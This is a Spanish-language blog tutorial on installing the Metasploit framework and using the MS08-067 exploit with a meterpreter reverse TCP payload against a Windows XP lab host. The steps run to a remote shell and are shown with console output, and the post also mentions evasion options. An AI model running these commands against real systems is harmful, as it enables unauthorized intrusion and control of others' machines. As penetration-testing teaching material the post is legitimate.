---
layout: post
title: "Framework Metasploit"
date: 2016-11-01 10:26:04 -0500
categories: linux
---

El framework Metasploit es una herramienta para desarrollar y ejecutar software con el fin de aprovechar vulnerabilidades de seguridad en sistemas de información remotos.

## Instalación

Actualizamos el software del equipo

    $ sudo apt update

Instalamos Metasploit:

    $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

Arrancamos el servidor de bases de datos postgresql:

    $ service postgresql start

Iniciamos Metasploit

    $ msfconsole

La primera vez que inciamos el framework, este nos pregunta si queremos usar una base de datos, a lo cual respondemos 'yes'.

## Módulos

Un módulo es una pieza independiente de software que extiende la funcionalidad del framework. Los módulos se clasifican en tipos según su propósito, por ejemplo, cualquier módulo que abre una consola en el objetivo es un módulo de explotación, o **exploit**.

Lo primero que hacemos es cargar el módulo que vamos a utilizar

    msf > use exploit/windows/smb/ms08_067_netapi

Antes de utilizar el módulo debemos ver su descripción:

    msf exploit(ms08_067_netapi) > info

Con esta información podemos identificar:

  * La lista de productos y versiones que presentan la vulnerabilidad que aprovecha el módulo.

  * El tipo de vulnerabilidad y la forma como se aprovecha, así como los posibles efectos secundarios que pueda tener su explotación.

  * Los objetivos que han sido probados. Si el objetivo contra el cual se piensa utilizar el módulo no ha sido probado, es probable que no funcione.

  * Las condiciones que debe cumplir el objetivo para ser vulnerable.

Si el módulo se adapta a nuestras necesidades, a continuación debemos revisar con detalle las opciones:

    msf exploit(ms08_067_netapi) > show options

Los módulos vienen con la mayoría de opciones preconfiguradas, sin embargo se deben revisar y ajustar en caso de que no se ajusten a nuestros requerimientos, como por ejemplo la dirección IP del sistema de información remoto:

    msf exploit(ms08_067_netapi) > set RHOST 192.168.0.5

Si queremos realizar una configuración más detallada, podemos ver más opciones avanzadas o de evasión:

    msf exploit(ms08_067_netapi) > show advanced
    msf exploit(ms08_067_netapi) > show evasion

Cuando un módulo se publica, se envía un pull request al [repositorio de Metasploit en GitHub](https://github.com/rapid7/metasploit-framework), y en este pull request se encuentra toda la información que se necesita saber acerca del módulo.

### Payload

Una vez se obtiene una sesión en la consola del sistema de información remoto por medio de un **exploit**, podemos suministrar piezas de código que se ejecuten en el objetivo comprometido para establecer conexiones y determinar el comportamiento del sistema una vez controlado. Estas piezas de código son los módulos **Payload**.

Uno de los payload más usados es **meterpreter**, el cual proporciona una consola interactiva multifuncional avanzada que permite realizar tareas como descargar archivos, obtener información de usuarios e incluso saltar a otras redes. Este módulo se ejecuta en memoria y es indetectable para la mayoría de sistemas de detección de intrusos.

Las conexiones con el sistema comprometido pueden hacerse de dos maneras: **bind** o **reverse**. En la primera, el sistema comprometido abre un puerto en el cual espera conexiones entrantes, mientras que en el segundo, el sistema comprometido trata de conectarse al equipo atacante, generando conexiones de salida.

Agregamos el módulo Payload `windows/meterpreter/reverse_tcp` a nuestro exploit para que una vez se tenga acceso a la consola del sistema objetivo, este inicie una conexión TCP hacia la máquina atacante y una vez establecida la sesión se controle el equipo utilizando meterpreter.

    msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp

Así como el exploit, este módulo también tiene unas opciones de configuración, que se pueden revisar y ajustar:

    msf exploit(ms08_067_netapi) > show options

En este caso configuramos la dirección IP y el puerto del equipo hacia donde el sistema remoto comprometido debe conectarse:

    msf exploit(ms08_067_netapi) > set LHOST 192.168.0.4
    msf exploit(ms08_067_netapi) > set LPORT 6666

Luego de configurar el **exploit** junto con su **payload**, solo queda decirle a metasploit que ejecute estos módulos:

    msf exploit(ms08_067_netapi) > run

Como resultado obtenemos un acceso no autorizado a un sistema de información remoto por medio de la explotación de una vulnerabilidad:

    [*] Started reverse TCP handler on 192.168.0.4:6666
    [*] 192.168.0.5:445 - Automatically detecting the target...
    [*] 192.168.0.5:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
    [*] 192.168.0.5:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
    [*] 192.168.0.5:445 - Attempting to trigger the vulnerability...
    [*] Sending stage (957999 bytes) to 192.168.1.5
    [*] Meterpreter session 1 opened (192.168.0.4:6666 -> 192.168.0.5:1345) at 2016-11-01 20:16:18 -0500

    meterpreter > sysinfo
    Computer        : COMPUTER_1
    OS              : Windows XP (Build 2600, Service Pack 3).
    Architecture    : x86
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/win32

    meterpreter > ipconfig

    Interface  1
    ============
    Name         : MS TCP Loopback interface
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1520
    IPv4 Address : 127.0.0.1


    Interface  2
    ============
    Name         : Intel(R) PRO/1000 T Server Adapter - Packet Scheduler
    Miniport
    Hardware MAC : 03:1a:c7:78:f3:f7
    MTU          : 1500
    IPv4 Address : 192.168.0.5
    IPv4 Netmask : 255.255.255.0

    meterpreter > shell
    Process 1556 created.
    Channel 1 created.
    Microsoft Windows XP [Version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:\WINDOWS\system32>

Fuentes de información:

  * [GitHub Wiki Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-Metasploit-module-appropriately)

  * [Documentación Metasploit Rapid7](https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html)
